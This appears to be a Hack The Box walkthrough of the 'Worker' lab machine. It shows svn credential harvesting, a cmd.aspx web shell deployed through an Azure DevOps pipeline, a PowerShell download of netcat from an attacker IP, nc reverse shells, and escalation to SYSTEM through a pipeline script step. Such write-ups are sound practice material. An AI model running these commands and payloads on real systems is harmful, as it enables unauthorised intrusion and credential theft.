`└─$ nmap -p- -sSCV 10.10.10.203  --min-rate 999`
```
Host is up (0.076s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

#### Enum for port 3690 - service subversion
`└─$ nc 10.10.10.203 3690  `                     
```
( success ( 2 2 ( ) ( edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth 
log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list ) ) )
```
```
└─$ svn ls svn://10.10.10.203
dimension.worker.htb/
moved.txt
```
```
└─$ svn checkout svn://10.10.10.203
A    dimension.worker.htb
A    dimension.worker.htb/LICENSE.txt
A    dimension.worker.htb/README.txt
A    dimension.worker.htb/assets
A    dimension.worker.htb/assets/css
A    dimension.worker.htb/assets/css/fontawesome-all.min.css
A    dimension.worker.htb/assets/css/main.css
A    dimension.worker.htb/assets/css/noscript.css
A    dimension.worker.htb/assets/js
A    dimension.worker.htb/assets/js/breakpoints.min.js
A    dimension.worker.htb/assets/js/browser.min.js
A    dimension.worker.htb/assets/js/jquery.min.js
A    dimension.worker.htb/assets/js/main.js
A    dimension.worker.htb/assets/js/util.js
A    dimension.worker.htb/assets/sass
A    dimension.worker.htb/assets/sass/base
A    dimension.worker.htb/assets/sass/base/_page.scss
A    dimension.worker.htb/assets/sass/base/_reset.scss
A    dimension.worker.htb/assets/sass/base/_typography.scss
A    dimension.worker.htb/assets/sass/components
A    dimension.worker.htb/assets/sass/components/_actions.scss
A    dimension.worker.htb/assets/sass/components/_box.scss
A    dimension.worker.htb/assets/sass/components/_button.scss
A    dimension.worker.htb/assets/sass/components/_form.scss
A    dimension.worker.htb/assets/sass/components/_icon.scss
A    dimension.worker.htb/assets/sass/components/_icons.scss
A    dimension.worker.htb/assets/sass/components/_image.scss
A    dimension.worker.htb/assets/sass/components/_list.scss
A    dimension.worker.htb/assets/sass/components/_table.scss
A    dimension.worker.htb/assets/sass/layout
A    dimension.worker.htb/assets/sass/layout/_bg.scss
A    dimension.worker.htb/assets/sass/layout/_footer.scss
A    dimension.worker.htb/assets/sass/layout/_header.scss
A    dimension.worker.htb/assets/sass/layout/_main.scss
A    dimension.worker.htb/assets/sass/layout/_wrapper.scss
A    dimension.worker.htb/assets/sass/libs
A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss
A    dimension.worker.htb/assets/sass/libs/_functions.scss
A    dimension.worker.htb/assets/sass/libs/_mixins.scss
A    dimension.worker.htb/assets/sass/libs/_vars.scss
A    dimension.worker.htb/assets/sass/libs/_vendor.scss
A    dimension.worker.htb/assets/sass/main.scss
A    dimension.worker.htb/assets/sass/noscript.scss
A    dimension.worker.htb/assets/webfonts
A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot
A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg
A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff
A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot
A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff
A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
A    dimension.worker.htb/images
A    dimension.worker.htb/images/bg.jpg
A    dimension.worker.htb/images/overlay.png
A    dimension.worker.htb/images/pic01.jpg
A    dimension.worker.htb/images/pic02.jpg
A    dimension.worker.htb/images/pic03.jpg
A    dimension.worker.htb/index.html
A    moved.txt
Checked out revision 5.
```
indentify the versions
```
└─$ svn up -r 1
Updating '.':
D    moved.txt
Updated to revision 1.
                                                                                                              
┌──(ed㉿kali)-[/tmp]
└─$ svn checkout svn://10.10.10.203
A    moved.txt
Checked out revision 5.

└─$ svn up -r 2                    
Updating '.':
D    moved.txt
A    deploy.ps1
Updated to revision 2.
```
here A credential got
```
└─$ svn cat deploy.ps1  svn://10.10.10.203
$user = "nathen" 
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"

└─$ svn up -r 3                    
Updating '.':
D    moved.txt
A    deploy.ps1
Updated to revision 3.

└─$ svn cat moved.txt  svn://10.10.10.203    
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)
```

add hosts 
dimension.worker.htb devops.worker.htb

#### web Enum
dimension is a portal _page
devops for dev, a login page first, enter with the credential we got

use ffuf to identify subdomain, later we got all subdomain in the devops platform
`└─$ ffuf -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -u 'http://worker.htb' -H "Host:FUZZ.worker.htb" -t 100  -fw 27`
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://worker.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/combined_subdomains.txt
 :: Header           : Host: FUZZ.worker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 27
________________________________________________

alpha                   [Status: 200, Size: 6495, Words: 391, Lines: 171, Duration: 107ms]
cartoon                 [Status: 200, Size: 14803, Words: 927, Lines: 398, Duration: 108ms]
devops                  [Status: 401, Size: 20029, Words: 1248, Lines: 86, Duration: 162ms]
dimension               [Status: 200, Size: 14588, Words: 846, Lines: 369, Duration: 80ms]
lens                    [Status: 200, Size: 4971, Words: 294, Lines: 112, Duration: 120ms]
spectral                [Status: 200, Size: 7191, Words: 446, Lines: 174, Duration: 164ms]
story                   [Status: 200, Size: 16045, Words: 1068, Lines: 356, Duration: 148ms]
twenty                  [Status: 200, Size: 10134, Words: 641, Lines: 275, Duration: 122ms]
:: Progress: [653920/653920] :: Job [1/1] :: 1256 req/sec :: Duration: [0:11:59] :: Errors: 0 ::
```

#### FootHold
for page http://devops.worker.htb, I have credential to login
This is devops platform MS, after some research, we can identify some subdoamins, and there is one 'spectral' is diff, with a cmd.aspx page pushed
I create a new branch, since the master one I have no privi to build
add the cmdasd.aspx(we can find this page in the comments history by user,and it can be used) page into the new branch, Then build the applicaiton by pipline
It can also be done in git coomand line
```
git clone the project
git clone http://nathen:wendel98@devops.worker.htb/ekenas/SmartHotel360/_git/spectral

new branch
git checkout -b test

cp cmd page
git add .
git commit -m 'xx'

push it
git push -u origin test
__then build it using piplines
```

we can access to the cmd page on our host,
http://spectral.worker.htb/cmdasp.aspx
set the input as :
`powershell wget http://10.10.16.9/nc64.exe -outfile C:\windows\Temp\nc.exe`

`C:\windows\Temp\nc.exe 10.10.16.9 8821 -e cmd.exe`
```
┌──(ed㉿kali)-[~]
└─$ nc -nvlp 8821
listening on [any] 8821 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.203] 55462
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 32D6-9041

 Directory of C:\Users

2020-07-07  16:53    <DIR>          .
2020-07-07  16:53    <DIR>          ..
2020-03-28  14:59    <DIR>          .NET v4.5
2020-03-28  14:59    <DIR>          .NET v4.5 Classic
2020-08-17  23:33    <DIR>          Administrator
2020-03-28  14:01    <DIR>          Public
2020-07-22  00:11    <DIR>          restorer
2020-07-08  18:22    <DIR>          robisl
```
OS enum, to find additiaonal drive
`C:\Windows\System32\inetsrv>wmic logicaldisk get deviceid, volumename, description`
```
wmic logicaldisk get deviceid, volumename, description

Description       DeviceID  VolumeName  
Local Fixed Disk  C:                    
Local Fixed Disk  W:        Work  

or use powershell
C:\Windows\System32\inetsrv>powershell -c get-psdrive -psprovider filesystem
powershell -c get-psdrive -psprovider filesystem

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
C                  19,75          9,65 FileSystem    C:\                                       Windows\System32\inetsrv
W                   2,52         17,48 FileSystem    W:\ 

C:\Windows\System32\inetsrv>W:
W:

W:\>dir
dir
 Volume in drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:\

2020-06-16  17:59    <DIR>          agents
2020-03-28  14:57    <DIR>          AzureDevOpsData
2020-04-03  10:31    <DIR>          sites
2020-06-20  15:04    <DIR>          svnrepos
               0 File(s)              0 bytes
               4 Dir(s)  18�766�901�248 bytes free
```

#### lateral move
`W:\>dir svnrepos\www`
```
dir svnrepos\www
 Volume in drive W is Work
 Volume Serial Number is E82A-AEA8

 Directory of W:\svnrepos\www

2020-06-20  10:29    <DIR>          .
2020-06-20  10:29    <DIR>          ..
2020-06-20  14:30    <DIR>          conf
2020-06-20  14:52    <DIR>          db
2020-06-20  10:29                 2 format
2020-06-20  10:29    <DIR>          hooks
2020-06-20  10:29    <DIR>          locks
2020-06-20  10:29               251 README.txt
               2 File(s)            253 bytes
               6 Dir(s)  18�766�901�248 bytes free
```

`W:\svnrepos\www\conf>type passwd`
```
type passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
```

get  user credential : robisl = wolves11

`└─$ evil-winrm -i worker.htb -u robisl -p wolves11`
```                                   
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\robisl\Documents> whoami
worker\robisl
```

#### ES
after enum and use winpeas. nothing usefual info got.
back to devops,use user to login
another porject we have access, and this user is in the group of build

Project Settings > Agent pools > Setup > Agents > Hamilton11 > Capabilities
here we find this app is running by SYSTEM

Pipelines > New Pipeline  
here we build this project, a script field is in this process, test it with 'id'
```
# ASP.NET Core
# Build and test ASP.NET Core projects targeting .NET Core.
# Add steps that run tests, create a NuGet package, deploy, and more:
# https://docs.microsoft.com/azure/devops/pipelines/languages/dotnet-core

trigger:
- sl

pool: 'Setup'

variables:
  buildConfiguration: 'Release'

steps:
- script: id
  displayName: For test
```

start it
```
##[section]Starting: For test
==============================================================================
Task         : Command line
Description  : Run a command line script using Bash on Linux and macOS and cmd.exe on Windows
Version      : 2.151.1
Author       : Microsoft Corporation
Help         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line
==============================================================================
Generating script.
Script contents:
id
========================== Starting Command Output ===========================
##[command]"C:\Windows\system32\cmd.exe" /D /E:ON /V:OFF /S /C "CALL "w:\agents\agent12\_work\_temp\0b267439-15a9-41d8-93ae-3c4d63e18a6b.cmd""
uid=18(SYSTEM) gid=18 groups=18
##[section]Finishing: For test
```
awesome, it works, then repalce it with a nc lient, nc we have upladed before
```
# ASP.NET Core
# Build and test ASP.NET Core projects targeting .NET Core.
# Add steps that run tests, create a NuGet package, deploy, and more:
# https://docs.microsoft.com/azure/devops/pipelines/languages/dotnet-core

trigger:
- sl

pool: 'Setup'

variables:
  buildConfiguration: 'Release'

steps:
- script: C:\Users\robisl\Documents\nc.exe -e cmd 10.10.16.9 8822
  displayName: For test
```
set a listener on attack machine
`└─$ nc -nvlp 8822`
```
listening on [any] 8822 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.203] 56754
Microsoft Windows [Version 10.0.17763.1282]
(c) 2018 Microsoft Corporation. All rights reserved.

W:\agents\agent11\_work\8\s>whoami
whoami
nt authority\system
```

#### lesson learned
- port 3690, for svn enum
- devops experince
- os enum to find driver on host
